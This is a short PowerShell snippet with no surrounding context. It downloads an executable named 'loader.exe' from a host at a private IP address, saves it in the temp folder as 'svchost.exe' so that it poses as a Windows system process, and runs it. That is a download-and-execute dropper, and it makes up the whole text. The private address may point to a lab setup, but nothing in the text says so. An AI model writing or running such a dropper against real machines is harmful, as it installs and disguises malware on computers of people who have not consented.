$url = "http://192.168.29.130/loader.exe"
$out = "$env:TEMP\svchost.exe"
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process $out
